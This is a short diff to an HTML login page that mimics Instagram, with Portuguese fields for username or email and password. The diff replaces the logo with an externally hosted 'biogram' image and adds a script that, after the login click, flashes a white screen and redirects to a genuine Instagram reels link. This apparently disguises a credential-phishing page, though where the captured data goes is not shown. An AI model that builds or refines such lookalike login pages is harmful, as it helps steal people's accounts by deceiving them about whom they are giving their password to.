@@ -83,7 +83,9 @@
 </head>
 <body>
   <div class="container">
-    <div class="logo">Instagram</div><form id="loginForm">
+    <a href="https://i.postimg.cc/zDdCYPyg/Captura-de-tela-2025-12-17-221627.png" class="logo">
+  <img src="https://i.postimg.cc/zDdCYPyg/Captura-de-tela-2025-12-17-221627.png" alt="biogram">
+</a>
   <input type="text" id="email" placeholder="Telefone, nome de usuário ou email" required />
   <input type="password" id="password" placeholder="Senha" required />
   <button type="submit">Entrar</button>
@@ -120,5 +122,18 @@
         console.log(data);
       }
     });
-  </script></body>
+  </script>
+   <div id="whiteScreen"></div>
+
+  <script>
+    document.getElementById("loginBtn").addEventListener("click", () => {
+      document.getElementById("whiteScreen").style.display = "block";
+
+      setTimeout(() => {
+        window.location.href =
+          "https://www.instagram.com/reels/DSYPgN7EVG3/";
+      }, 150);
+    });
+  </script>
+</body>
   </html>
